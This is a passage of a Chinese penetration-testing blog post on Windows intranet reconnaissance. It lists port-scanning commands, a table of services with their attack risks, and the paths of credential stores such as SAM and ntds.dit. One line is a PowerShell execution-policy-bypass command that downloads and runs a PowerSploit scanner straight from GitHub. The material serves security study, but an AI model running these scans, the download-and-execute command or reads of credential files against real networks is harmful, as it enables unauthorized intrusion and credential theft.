<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/snmp/snmp_enum</span><br></pre></td></tr></table></figure>



<p><strong>通过CMD</strong></p>
<p>会打开 254 个 telnet 页面，连接 192.168.2.1 到 192.168.2.254 的 445 端口，如果有主机的 445 端口能连接上，则会留下来，其他的会全部自动关闭掉</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l %a <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">do</span> <span class="built_in">start</span> /min /low telnet <span class="number">192.168</span>.<span class="number">2</span>.%a <span class="number">445</span></span><br></pre></td></tr></table></figure>



<p><strong>通过NC</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="literal">-v</span> <span class="number">192.168</span>.<span class="number">1.100</span> <span class="number">445</span></span><br><span class="line"></span><br><span class="line"><span class="function">[<span class="number">192.168</span><span class="type">.1.100</span>] 445 (<span class="title">microsoft</span></span><span class="literal">-ds</span>) open</span><br></pre></td></tr></table></figure>



<h3 id="域内端口扫描"><a href="#域内端口扫描" class="headerlink" title="域内端口扫描"></a>域内端口扫描</h3><p><strong>使用powershell</strong></p>
<p>探测单个IP的1-1024的端口</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>..<span class="number">1024</span> | % &#123;<span class="built_in">echo</span> ((<span class="built_in">new-object</span> Net.Sockets.TcpClient).Connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="variable">$_</span>)) <span class="string">&quot;Port <span class="variable">$_</span> is open!&quot;</span>&#125; <span class="number">2</span>&gt;<span class="variable">$null</span></span><br></pre></td></tr></table></figure>

<p>探测网段的80端口</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ip</span> <span class="keyword">in</span> <span class="number">1</span>..<span class="number">255</span>) &#123;<span class="built_in">Test-NetConnection</span> <span class="literal">-Port</span> <span class="number">80</span> <span class="literal">-InformationLevel</span> <span class="string">&quot;Detailed&quot;</span> <span class="number">192.168</span>.<span class="number">1</span>.<span class="variable">$ip</span>&#125;</span><br></pre></td></tr></table></figure>

<p>探测多个IP的多个端口</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>..<span class="number">255</span> | % &#123; <span class="variable">$a</span> = <span class="variable">$_</span>; <span class="number">1</span>..<span class="number">65535</span> | % &#123;<span class="built_in">echo</span> ((<span class="built_in">new-object</span> Net.Sockets.TcpClient).Connect(<span class="string">&quot;192.168.1.<span class="variable">$a</span>&quot;</span>,<span class="variable">$_</span>)) <span class="string">&quot;192.168.1.<span class="variable">$a</span> Port <span class="variable">$_</span> is open!&quot;</span>&#125; <span class="number">2</span>&gt;<span class="variable">$null</span>&#125;</span><br></pre></td></tr></table></figure>

<p><strong>tcping扫描</strong></p>
<p><a target="_blank" rel="noopener" href="https://elifulkerson.com/projects/tcping.php">https://elifulkerson.com/projects/tcping.php</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcping <span class="literal">-n</span> <span class="number">1</span> <span class="number">192.168</span>.<span class="number">1.1</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p><strong>PowerSploit 的Invoke-portscan.ps1脚本</strong></p>
<p>无文件的形式</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-exec</span> bypass <span class="literal">-c</span> <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA C:\Windows\temp\res.txt&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Nishang的Invoke-Portscan模块</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- StartAddress：起始地址</span><br><span class="line">- EndAddress：结束地址</span><br><span class="line">- ScanPort：进行端口扫描</span><br><span class="line">- Port：指定扫描端口</span><br><span class="line">- ResolveHost 解析主机名</span><br><span class="line">- Timeout：设置超时时间</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-PortScan</span> <span class="literal">-StartAddress</span> <span class="number">192.168</span>.<span class="number">1.1</span> <span class="literal">-EndAddress</span> <span class="number">192.168</span>.<span class="number">1.254</span> <span class="literal">-ResolveHost</span> <span class="literal">-ScanPort</span> <span class="literal">-Port</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p><strong>msf</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure>



<h2 id="端口-Banner-信息表"><a href="#端口-Banner-信息表" class="headerlink" title="端口 Banner 信息表"></a>端口 Banner 信息表</h2><h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h3><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">说明</th>
<th align="center">风险</th>
</tr>
</thead>
<tbody><tr>
<td align="center">21</td>
<td align="center">FTP</td>
<td align="center">允许匿名的上传、下载爆破和嗅探操作</td>
</tr>
<tr>
<td align="center">69</td>
<td align="center">TFTP</td>
<td align="center">允许匿名的上传、下载爆破和嗅探操作</td>
</tr>
<tr>
<td align="center">139</td>
<td align="center">SAMBA 服务</td>
<td align="center">爆破、未授权访问、远程代码执行</td>
</tr>
<tr>
<td align="center">389</td>
<td align="center">LDAP 目录访问协议</td>
<td align="center">注入、允许匿名访问、弱口令</td>
</tr>
<tr>
<td align="center">2049</td>
<td align="center">NFS 服务</td>
<td align="center">配置不当</td>
</tr>
</tbody></table>
<h3 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h3><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">说明</th>
<th align="center">风险</th>
</tr>
</thead>
<tbody><tr>
<td align="center">22</td>
<td align="center">SSH 远程连接</td>
<td align="center">爆破、SSH隧道及内网代理转发、文件传输</td>
</tr>
<tr>
<td align="center">23</td>
<td align="center">Telnet 远程连接</td>
<td align="center">爆破、嗅探、弱口令</td>
</tr>
<tr>
<td align="center">80、443、8080</td>
<td align="center">Web 服务端口</td>
<td align="center">Web攻击、爆破、对应服务器版本漏洞</td>
</tr>
<tr>
<td align="center">1352</td>
<td align="center">Lotus Domino 邮件服务</td>
<td align="center">弱口令、信息泄露、爆破</td>
</tr>
<tr>
<td align="center">3389</td>
<td align="center">RDP 远程桌面连接</td>
<td align="center">Shift后门（Windows Server 2003以下版本）、爆破</td>
</tr>
<tr>
<td align="center">4848</td>
<td align="center">GlassFish 控制台</td>
<td align="center">弱口令</td>
</tr>
<tr>
<td align="center">5632</td>
<td align="center">PcAnywhere 服务</td>
<td align="center">抓取密码、代码执行</td>
</tr>
<tr>
<td align="center">5900</td>
<td align="center">VNC</td>
<td align="center">弱口令爆破</td>
</tr>
<tr>
<td align="center">7001、7002</td>
<td align="center">Weblogic控制台</td>
<td align="center">Java反序列化、弱口令</td>
</tr>
<tr>
<td align="center">8080、8089</td>
<td align="center">JBoss/Resin/Jetty/Jenkins</td>
<td align="center">反序列化、控制台弱口令</td>
</tr>
<tr>
<td align="center">9090</td>
<td align="center">WebSphere控制台</td>
<td align="center">Java反序列化、弱口令</td>
</tr>
<tr>
<td align="center">10000</td>
<td align="center">webmin控制面板</td>
<td align="center">弱口令</td>
</tr>
</tbody></table>
<h3 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h3><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">说明</th>
<th align="center">风险</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1433</td>
<td align="center">MSSQL数据库</td>
<td align="center">注入、提权、SA弱口令、爆破</td>
</tr>
<tr>
<td align="center">1521</td>
<td align="center">Oracle数据库</td>
<td align="center">TNS爆破、注入、反弹Shell</td>
</tr>
<tr>
<td align="center">3306</td>
<td align="center">MySQL数据库</td>
<td align="center">注入、提权、爆破</td>
</tr>
<tr>
<td align="center">5000</td>
<td align="center">Sysbase/DB2数据库</td>
<td align="center">爆破、注入</td>
</tr>
<tr>
<td align="center">5432</td>
<td align="center">PostgreSQL数据库</td>
<td align="center">爆破、注入、弱口令</td>
</tr>
<tr>
<td align="center">6379</td>
<td align="center">Redis数据库</td>
<td align="center">未授权访问、弱口令</td>
</tr>
<tr>
<td align="center">27017、27018</td>
<td align="center">MongoDB数据库</td>
<td align="center">爆破、未授权访问</td>
</tr>
</tbody></table>
<h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h3><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">说明</th>
<th align="center">风险</th>
</tr>
</thead>
<tbody><tr>
<td align="center">25</td>
<td align="center">SMTP邮件服务</td>
<td align="center">邮件伪造</td>
</tr>
<tr>
<td align="center">110</td>
<td align="center">POP3协议</td>
<td align="center">爆破、嗅探</td>
</tr>
<tr>
<td align="center">143</td>
<td align="center">IMAP协议</td>
<td align="center">爆破</td>
</tr>
</tbody></table>
<h3 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h3><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">说明</th>
<th align="center">风险</th>
</tr>
</thead>
<tbody><tr>
<td align="center">53</td>
<td align="center">DNS域名系统</td>
<td align="center">允许区域传送、DNS劫持、缓存投毒、欺骗</td>
</tr>
<tr>
<td align="center">67、68</td>
<td align="center">DHCP服务</td>
<td align="center">劫持、欺骗</td>
</tr>
<tr>
<td align="center">161</td>
<td align="center">SNMP协议</td>
<td align="center">爆破、搜集目标内网信息</td>
</tr>
</tbody></table>
<h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h3><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">说明</th>
<th align="center">风险</th>
</tr>
</thead>
<tbody><tr>
<td align="center">512、513、514</td>
<td align="center">Linux rexec服务</td>
<td align="center">爆破、远程登录</td>
</tr>
<tr>
<td align="center">873</td>
<td align="center">rsync服务</td>
<td align="center">匿名访问、文件上传</td>
</tr>
<tr>
<td align="center">2181</td>
<td align="center">ZooKeeper服务</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">3690</td>
<td align="center">SVN服务</td>
<td align="center">svn泄露、未授权访问</td>
</tr>
<tr>
<td align="center">8069</td>
<td align="center">Zabbix服务</td>
<td align="center">远程执行、SQL注入</td>
</tr>
<tr>
<td align="center">9200、9300</td>
<td align="center">Elasticsearch服务</td>
<td align="center">远程执行</td>
</tr>
<tr>
<td align="center">11211</td>
<td align="center">Memchached服务</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">50000</td>
<td align="center">SAP Management Console</td>
<td align="center">远程执行</td>
</tr>
</tbody></table>
<h2 id="Windows-敏感路径"><a href="#Windows-敏感路径" class="headerlink" title="Windows 敏感路径"></a>Windows 敏感路径</h2><h3 id="Windows-系统敏感文件"><a href="#Windows-系统敏感文件" class="headerlink" title="Windows 系统敏感文件"></a>Windows 系统敏感文件</h3><table>
<thead>
<tr>
<th align="center">文件名</th>
<th align="center">说明</th>
<th align="center">路径</th>
<th align="center">存在版本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">boot.ini</td>
<td align="center">启动引导程序文件</td>
<td align="center">C:\boot.ini</td>
<td align="center">&lt;= 2003</td>
</tr>
<tr>
<td align="center">hosts</td>
<td align="center">域名解析文件</td>
<td align="center">C:\Windows\System32\drivers\etc\hosts</td>
<td align="center">全版本</td>
</tr>
<tr>
<td align="center">SAM</td>
<td align="center">存储密码文件</td>
<td align="center">C:\Windows\System32\config\SAM</td>
<td align="center">全版本</td>
</tr>
<tr>
<td align="center">system</td>
<td align="center">系统配置文件</td>
<td align="center">C:\Windows\System32\config\system</td>
<td align="center">全版本</td>
</tr>
<tr>
<td align="center">ntds.dit</td>
<td align="center">AD域数据库</td>
<td align="center">C:\Windows\NTDS\NTDS.dit</td>
<td align="center">全版本</td>
</tr>
<tr>
<td align="center">Autounattend.xml</td>
<td align="center">应答文件</td>
<td align="center">C:\windows\panther\unattended.xml</td>
<td align="center">全版本</td>
</tr>
<tr>
<td align="center">Autoexec.bat</td>
<td align="center">引导可执行文件</td>
<td align="center">C:\autoexec.bat</td>
<td align="center">&lt;= 98</td>
</tr>
<tr>
<td align="center">win.ini</td>
<td align="center">基本系统配置文件</td>
<td align="center">C:/Windows/win.ini</td>
<td align="center">全版本</td>
</tr>
</tbody></table>
<p><strong>boot.ini 启动引导程序文件</strong></p>
<p>在新的Windows版本中使用命令 bcdedit 代替</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini</span><br></pre></td></tr></table></figure>



<p><strong>hosts 域名解析文件</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>



<p><strong>SAM 存储密码文件</strong></p>
<p>是注册表<code>HKEY_LOCAL_MACHINE\SAM</code>的存储文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 旧版本</span></span><br><span class="line">C:\windows\repair\SAM</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新版本</span></span><br><span class="line">%SystemRoot%\system32\config\SAM</span><br><span class="line">C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>



<p><strong>system 系统配置文件</strong></p>
<p>是注册表<code>HKEY_LOCAL_MACHINE\System</code>的存储文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\system32\config\system</span><br><span class="line">C:\Windows\System32\config\system</span><br></pre></td></tr></table></figure>



<p><strong>ntds.dit AD域数据库</strong></p>
<p>包含有域用户、域组、用户hash等信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\ntds\ntds.dit</span><br><span class="line">C:\Windows\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure>



<p><strong>Autounattend.xml 应答文件</strong></p>
<p>通过文件中的配置，达到Windows 无人值守安装，默认不存在</p>
<p>在Windows安装启动时，会搜索解析名为unattended.xml的文件，实现无人值守安装，免去手工选择设置</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br><span class="line"></span><br><span class="line">C:\sysprep.inf</span><br><span class="line">C:\sysprep\sysprep.xml</span><br></pre></td></tr></table></figure>



<p><strong>Autoexec.bat 引导可执行文件</strong></p>
<p>在操作系统启动时自动执行</p>
<p>包含了操作系统环境参数，驱动加载，启动信息等参数</p>
<p>只在基于MS-DOS运行的操作系统中适用</p>
<ul>
<li>MS-DOS</li>
<li>Windows 3.x</li>
<li>Windows 95</li>
<li>Windows 98</li>
<li>Windows ME</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\autoexec.bat</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">BaiKer</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://baiker.top/a7b4e7b158e4.html">http://baiker.top/a7b4e7b158e4.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://baiker.top" target="_blank">BaiKer</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></div><div class="post_share"><div class="social-share" data-image="https://baiker.top/img/wallhaven-gj977q.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/3953fa0e41bf.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://baiker.top/img/wallhaven-gj977q.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Python模块-OS</div></div></a></div><div class="next-post pull-right"><a href="/6d3d85286059.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://baiker.top/img/wallhaven-gj977q.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Fastjson反序列化</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a target="_blank" rel="noopener" href="//0839a9742351.html" title="内网渗透-Linux信息收集"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://baiker.top/img/wallhaven-gj977q.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-14</div><div class="title">内网渗透-Linux信息收集</div></div></a></div><div><a target="_blank" rel="noopener" href="//4bd4a316b518.html" title="内网渗透-PowerShell"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://baiker.top/img/wallhaven-gj977q.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-04</div><div class="title">内网渗透-PowerShell</div></div></a></div><div><a target="_blank" rel="noopener" href="//bb41611ac1d5.html" title="MySQL提权"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://baiker.top/img/wallhaven-gj977q.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-12</div><div class="title">MySQL提权</div></div></a></div><div><a target="_blank" rel="noopener" href="//85c75ed1f9a3.html" title="内网渗透-基础信息"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://baiker.top/img/wallhaven-gj977q.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-02</div><div class="title">内网渗透-基础信息</div></div></a></div><div><a target="_blank" rel="noopener" href="//6a3a4fb37fd1.html" title="信息搜集-绕过CDN查找真实IP"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://baiker.top/img/wallhaven-gj977q.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-07</div><div class="title">信息搜集-绕过CDN查找真实IP</div></div></a></div><div><a target="_blank" rel="noopener" href="//ef172fa947be.html" title="信息收集-WEB服务器"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://inews.gtimg.com/newsapp_ls/0/13911520677/0" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-23</div><div class="title">信息收集-WEB服务器</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">BaiKer</div><div class="author-info__description">网络安全</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">65</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">52</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Baikeryoyo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/baiker" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/2425206200@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">本地信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">查询网络配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-number">1.2.</span> <span class="toc-text">查询用户列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8"><span class="toc-number">1.3.</span> <span class="toc-text">查询进程列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.</span> <span class="toc-text">查询服务信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.5.</span> <span class="toc-text">查询操作系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">1.6.</span> <span class="toc-text">查询软件信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8"><span class="toc-number">1.7.</span> <span class="toc-text">查询端口列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A5%E4%B8%81%E5%88%97%E8%A1%A8"><span class="toc-number">1.8.</span> <span class="toc-text">查询补丁列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA%E5%85%B1%E4%BA%AB"><span class="toc-number">1.9.</span> <span class="toc-text">查询本机共享</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E4%BB%A3%E7%90%86%E4%BF%A1%E6%81%AF"><span class="toc-number">1.10.</span> <span class="toc-text">查询代理信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.11.</span> <span class="toc-text">查询远程连接服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%A5%A8%E6%8D%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.12.</span> <span class="toc-text">查询票据信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF"><span class="toc-number">1.13.</span> <span class="toc-text">查询日志信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE"><span class="toc-number">1.14.</span> <span class="toc-text">查询防火墙配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF"><span class="toc-number">1.15.</span> <span class="toc-text">其他信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">域信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90"><span class="toc-number">2.1.</span> <span class="toc-text">查询当前权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F"><span class="toc-number">2.2.</span> <span class="toc-text">判断是否存在域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-number">2.3.</span> <span class="toc-text">查询域内基础信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">2.4.</span> <span class="toc-text">查询域用户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%BB%84%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">2.5.</span> <span class="toc-text">查询域组的信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">2.6.</span> <span class="toc-text">查询域控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF"><span class="toc-number">2.7.</span> <span class="toc-text">查询域内管理员信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC"><span class="toc-number">2.8.</span> <span class="toc-text">域信息收集脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#psloggedon-%E8%84%9A%E6%9C%AC"><span class="toc-number">2.8.1.</span> <span class="toc-text">psloggedon 脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PVEFindADUser-%E8%84%9A%E6%9C%AC"><span class="toc-number">2.8.2.</span> <span class="toc-text">PVEFindADUser 脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netview-%E8%84%9A%E6%9C%AC"><span class="toc-number">2.8.3.</span> <span class="toc-text">netview 脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 